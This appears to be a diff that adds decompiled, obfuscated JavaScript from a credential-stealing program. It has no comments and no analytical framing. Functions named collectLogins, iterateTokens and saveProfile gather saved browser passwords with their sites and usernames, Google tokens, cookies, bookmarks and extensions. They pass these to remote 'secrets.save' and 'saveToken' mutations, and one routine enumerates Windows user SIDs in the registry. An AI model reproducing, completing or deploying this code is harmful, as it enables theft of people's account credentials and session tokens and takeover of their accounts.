+	ACCU = func_u_0x100000633
+	try
+	{
+		r1 = new {"V": 5190, "J": "]1@2", "S": 116760, "g": ")Lyh", "L": 73603, "X": "m[K#", "j": 18523, "E": "[()[", "c": 89298, "x": "%r7r", "K": 21794, "u": "mwAz", "A": 85919, "s": ")Lyh"}
+		r2 = Set(Scope[10825])
+		r12 = r1["V"]
+		r13 = r1["L"]
+		r9 = a0["iterExtensions"]
+		r11 = r9()
+		ACCU = r11[Symbol.asyncIterator]
+		if (!r11[Symbol.asyncIterator] == undefined)
+		{
+			r12 = r11[Symbol.asyncIterator]
+			ACCU = r11[Symbol.asyncIterator]()
+		}
+		r10 = ACCU
+		r9 = r10["next"]
+		ACCU = false
+		r11 = false
+		try
+		{
+			while (true)
+			{
+				r11 = true
+				r17 = r9()
+				r16 = await r17
+				r17 = _GeneratorGetResumeMode(Scope[10825])
+				if (!r17 === 0)
+				{
+					ACCU = r16
+				}
+				ACCU = r16
+				r15 = r16
+				if (r15["done"]) break
+				r11 = false
+				r6 = r15["value"]
+				r18 = r2["add"]
+				ACCU = r15["value"]["originalId"]
+				r15 = r15["value"]
+				r19 = r2
+				if (ACCU) continue
+				ACCU = r18(r6["id"])
+			}
+			ACCU = -1
+			r13 = -1
+			r12 = -1
+		}
+		catch
+		{
+			r13 = ACCU
+			r12 = 0
+		}
+		if (!r11)
+		{
+			try
+			{
+				if (!r10["return"] == undefined)
+				{
+					r21 = r10["return"]()
+					r20 = await r21
+					r21 = _GeneratorGetResumeMode(Scope[10825])
+					if (!r21 === 0)
+					{
+						ACCU = r20
+					}
+					ACCU = r20
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r12 === 0)
+		{
+			ACCU = r13
+		}
+		r10 = Array.from(r2)
+		r9 = r10["sort"]
+		r10 = r9()
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[10826]
+	return Scope[10826][2]
+}
+function func_iterateTokens_0x100000632(a0)
+{
+	r11 = <closure>
+	r12 = <this>
+	ACCU = func_n_0x100000630
+	try
+	{
+		r1 = new {"V": "mwAz", "J": 113155, "S": "9pb7", "g": 86025, "L": "]C&)", "X": 82906, "j": "F1xf", "E": 15246, "c": "kh^v", "x": 60689, "K": "h98j", "u": 93299, "A": "b48I", "s": 124487}
+		r16 = r1["g"]
+		r15 = a0["iterTokens"]
+		r15 = r15()
+		r13 = func_collectAsync_0x1000004d1(r15)
+		r12 = await r13
+		r13 = _GeneratorGetResumeMode(Scope[10827])
+		if (!r13 === 0)
+		{
+			ACCU = r12
+		}
+		r3 = r12
+		r13 = GetIterator(r3)
+		r12 = r13["next"]
+		ACCU = false
+		r14 = false
+		try
+		{
+			while (true)
+			{
+				r14 = true
+				r18 = r12()
+				if (r18["done"]) break
+				r14 = false
+				r23 = new {"scope": null, "userId": null, "value": null}
+				r23["scope"] = "CHROME"
+				r23["userId"] = r18["value"]["userId"]
+				r23["value"] = r18["value"]["value"]
+				r20 = func_Token_0x1000005e8(r23)
+				r19 = r20["catch"]
+				r20 = r19(func_pushError_0x100000142)
+				r19 = await r20
+				r20 = _GeneratorGetResumeMode(Scope[10827])
+				if (r20 === 0) continue
+				ACCU = r19
+				ACCU = r19
+			}
+			ACCU = -1
+			r16 = -1
+			r15 = -1
+		}
+		catch
+		{
+			r16 = ACCU
+			r15 = 0
+		}
+		if (!r14)
+		{
+			try
+			{
+				if (!r13["return"] == undefined)
+				{
+					ACCU = r13["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r15 === 0)
+		{
+			ACCU = r16
+		}
+		r13 = undefined
+		ACCU = r13
+		return r13
+	}
+	catch {}
+	r12 = ACCU
+	ACCU = null
+	ACCU = Scope[10828]
+	return Scope[10828][2]
+}
+function func_Normalizeemail_0x10000062f(a0)
+{
+	r3 = a0["trim"]
+	a0 = r3()
+	try
+	{
+		r5 = \^\\\\S+@\\\\S+\\\\.\\\\S+$\
+		r4 = r5["test"]
+		if (r4(a0))
+		{
+			return global_wz["default"](a0)
+		}
+	}
+	catch
+	{
+		ACCU = null
+		ACCU = Scope[10829]
+	}
+	return a0
+}
+function func_collectLogins_0x10000062d(a0)
+{
+	r15 = <closure>
+	r16 = <this>
+	ACCU = func_n_0x100000627
+	try
+	{
+		r1 = new {"V": "C0qY", "J": 21991, "S": "iSZ6", "g": 121096, "L": "m[K#", "X": 16076, "j": "K&pk", "E": 39880, "c": "x&b0", "x": 85863, "K": ")Lyh", "u": 32120, "A": "%r7r", "s": 27015, "b": "9hYk", "i": 79626, "w": "I@Bf", "f": 38969, "t": 57814, "P": "epz[", "I": 4723, "p": "JrBU", "o": 32191, "R": "gm42", "v": 43020, "N": 20722, "M": "8dGo", "k": 35046, "Q": "iSZ6", "W": 30250, "T": 53919}
+		r3 = []
+		r19 = r1["S"]
+		r20 = r1["L"]
+		r16 = a0["iterLogins"]
+		r18 = r16()
+		ACCU = r18[Symbol.asyncIterator]
+		if (!r18[Symbol.asyncIterator] == undefined)
+		{
+			r19 = r18[Symbol.asyncIterator]
+			ACCU = r18[Symbol.asyncIterator]()
+		}
+		r17 = ACCU
+		r16 = r17["next"]
+		ACCU = false
+		r18 = false
+		try
+		{
+			while (true)
+			{
+				r18 = true
+				r24 = r16()
+				r23 = await r24
+				r24 = _GeneratorGetResumeMode(Scope[10830])
+				if (!r24 === 0)
+				{
+					ACCU = r23
+				}
+				ACCU = r23
+				r22 = r23
+				if (r22["done"]) break
+				r18 = false
+				r12 = func_normalizeUrl_0x1000002a3(r22["value"]["origin"])
+				r13 = func_Normalizeemail_0x10000062f(r22["value"]["username"])
+				r27 = r13["length"]
+				if (r27 > 256) continue
+				r27 = r22["value"]["password"]["length"]
+				if (r27 > 256) continue
+				r27 = r12["length"]
+				if (r27 > 256) continue
+				r25 = r3["push"]
+				r27 = new {"application": null, "scope": null, "login": null, "value": null, "extra": null}
+				r28 = a0["browser"]
+				r27["application"] = r28["application"]
+				r27["scope"] = "WEBSITE"
+				r27["login"] = r13
+				r27["value"] = r22["value"]["password"]
+				r27["extra"] = r12
+				ACCU = r25(r27)
+			}
+			ACCU = -1
+			r20 = -1
+			r19 = -1
+		}
+		catch
+		{
+			r20 = ACCU
+			r19 = 0
+		}
+		if (!r18)
+		{
+			try
+			{
+				if (!r17["return"] == undefined)
+				{
+					r28 = r17["return"]()
+					r27 = await r28
+					r28 = _GeneratorGetResumeMode(Scope[10830])
+					if (!r28 === 0)
+					{
+						ACCU = r27
+					}
+					ACCU = r27
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r19 === 0)
+		{
+			ACCU = r20
+		}
+		r17 = func_saveSecret_0x1000005d6(r3)
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10830])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r17 = undefined
+		ACCU = r17
+		return r17
+	}
+	catch {}
+	r16 = ACCU
+	ACCU = null
+	ACCU = Scope[10831]
+	return Scope[10831][2]
+}
+function func_Token_0x1000005e8(a0)
+{
+	r7 = "google-token"
+	r9 = global_iB["google"]["saveToken"]
+	r9 = r9["mutate"]
+	r11 = new [0, 0]
+	r11[0] = "userId"
+	r11[1] = "scope"
+	r5 = r1
+	return global_hl(r7, a0, r9, r11)
+}
+function func_saveProfile_0x1000005df(a0)
+{
+	r7 = "browser-profile"
+	r9 = global_iB["browsers"]["saveProfile"]
+	r9 = r9["mutate"]
+	r11 = new [0, 0, 0]
+	r11[0] = "application"
+	r11[1] = "user"
+	r11[2] = "path"
+	r12 = new [0, 0, 0, 0]
+	r10 = r11
+	r12[0] = "extensions"
+	r12[1] = "topOrigins"
+	r12[2] = "topBookmarks"
+	r12[3] = "cookies"
+	r5 = r1
+	return global_hl(r7, a0, r9, r10, r12)
+}
+function func_saveSecret_0x1000005d6(a0)
+{
+	r9 = global_iB["secrets"]["save"]["mutate"]
+	r5 = r1
+	return global_Kj("secrets", a0, r9)
+}
+function func_initQueue_0x1000005b2(a0, a1, a2)
+{
+	Scope[10883][3] = a0
+	Scope[10883][2] = a2
+	ACCU = func_queue_0x10000a92f
+	Scope[10883][6] = func_queue_0x10000a92f(func_queue_0x10000a92f)
+	return func_run_0x1000005b1
+}
+function func_isSid_0x100000566(a0)
+{
+	r4 = \^S-1-5-21-\\\\d+-\\\\d+-\\\\d+-\\\\d+$\
+	r3 = r4["test"]
+	return r3(a0)
+}
+function func_filterSid_0x10000055f()
+{
+	r5 = global_FS["default"]["registryEnumKeys"]
+	r5 = r5("HKU")
+	r4 = r5["filter"]
+	return r4(func_isSid_0x100000566)
+}
+function func_relpath_0x100000524(a0, a1, a2)
+{
+	r2 = (require("path"))["resolve"](a1)
+	r7 = a0["startsWith"]
+	if (r7(r2))
+	{
+		r7 = a0["replace"]
+		r5 = r7(r2, "")
+		r7 = (require("path"))["join"]
+		return r7(a2, r5)
+	}
+	r7 = a0["startsWith"]
+	if (r7(a1))
+	{
+		r7 = a0["replace"]
+		r4 = r7(a1, "")
+		r7 = (require("path"))["join"]
+		return r7(a2, r4)
+	}
+	ACCU = Error
+	ACCU = Error("Invalid path")
+}
+function func_collectAsync_0x1000004d1(a0, a1)
+{
+	r8 = <closure>
+	r9 = <this>
+	ACCU = func_n_0x1000004d0
+	try
+	{
+		ACCU = []
+		r2 = []
+		try
+		{
+			ACCU = a0[Symbol.asyncIterator]
+			r12 = a0
+			if (!a0[Symbol.asyncIterator] == undefined)
+			{
+				ACCU = a0[Symbol.asyncIterator]()
+			}
+			r11 = ACCU
+			r10 = r11["next"]
+			ACCU = false
+			r12 = false
+			try
+			{
+				while (true)
+				{
+					r12 = true
+					r18 = r10()
+					r17 = await r18
+					r18 = _GeneratorGetResumeMode(Scope[11006])
+					if (!r18 === 0)
+					{
+						ACCU = r17
+					}
+					ACCU = r17
+					r16 = r17
+					if (r16["done"]) break
+					r12 = false
+					ACCU = r2["push"](r16["value"])
+					r16 = r16["value"]
+				}
+				ACCU = -1
+				r14 = -1
+				r13 = -1
+			}
+			catch
+			{
+				r14 = ACCU
+				r13 = 0
+			}
+			if (!r12)
+			{
+				try
+				{
+					if (!r11["return"] == undefined)
+					{
+						r22 = r11["return"]()
+						r21 = await r22
+						r22 = _GeneratorGetResumeMode(Scope[11006])
+						if (!r22 === 0)
+						{
+							ACCU = r21
+						}
+						ACCU = r21
+					}
+					catch {}
+				}
+			}
+			ACCU = null
+			ACCU = r13 === 0
+			if (r13 === 0)
+			{
+				ACCU = r14
+			}
+		}
+		catch
+		{
+			r10 = ACCU
+			ACCU = null
+			ACCU = Scope[11007]
+			if (!a1)
+			{
+				ACCU = Scope[11007][2]
+			}
+		}
+		r10 = r2
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[11008]
+	return Scope[11008][2]
+}
+function func_noop_0x1000004cf()
+{
+	return undefined
+}
+function func_normalizeUrl_0x1000002a3(a0)
+{
+	r0 = new {"V": 42405, "J": "epz[", "S": 69595, "g": "vV[N", "L": 118310, "X": "A5nh"}
+	try
+	{
+		ACCU = URL
+		ACCU = URL(r0)
+	}
+	catch
+	{
+		ACCU = null
+		return a0
+	}
+	r5 = a0["split"]
+	r5 = r5("/")
+	r4 = r5["slice"]
+	r4 = r4(0, 3)
+	r3 = r4["join"]
+	return r3("/")
+}
+function func_abortError_0x100000144(a0)
+{
+	Scope[11214][2] = a0
+	return func_pushAbortError_0x100000143
+}
+function func_pushAbortError_0x100000143(a0)
+{
+	return func_pushError_0x100000142(a0, Scope[11214][2])
+}
+function func_pushError_0x100000142(a0, a1)
+{
+	r0 = new {"V": "b48I", "J": 97714, "S": "epz[", "g": 117612, "L": "epz[", "X": 95913, "j": "89J2", "E": 59689}
+	r5 = new {"KhfBD": null}
+	r5["KhfBD"] = func_instanceof_0x100000141
+	r4 = r5["KhfBD"]
+	ACCU = r4(a0, Error)
+	if (r4(a0, Error))
+	{
+		ACCU = a0
+	}
+	else
+	{
+		ACCU = Error
+		ACCU = Error(r0)
+	}
+	r2 = ACCU
+	r4 = global_tP["api"]["pushError"]
+	r7 = new {"context": null}
+	r7["context"] = a1
+	ACCU = r4(r2, r7)
+	return undefined
+}
+function func_spawnWorker_0x100000005(a0, a1)
+{
+	if (!(a0))
+	{
+		ACCU = Error
+		ACCU = Error("Worker root not configured")
+	}
+	r5 = new {"poolId": null, "initial": null}
+	r5["poolId"] = a0
+	r5["initial"] = a1
+	r3 = r5
+	r5 = (require("worker_threads"))["Worker"]
+	r7 = new {"workerData": null}
+	r7["workerData"] = r3
+	ACCU = r5
+	return r5((a0), r7)
+}
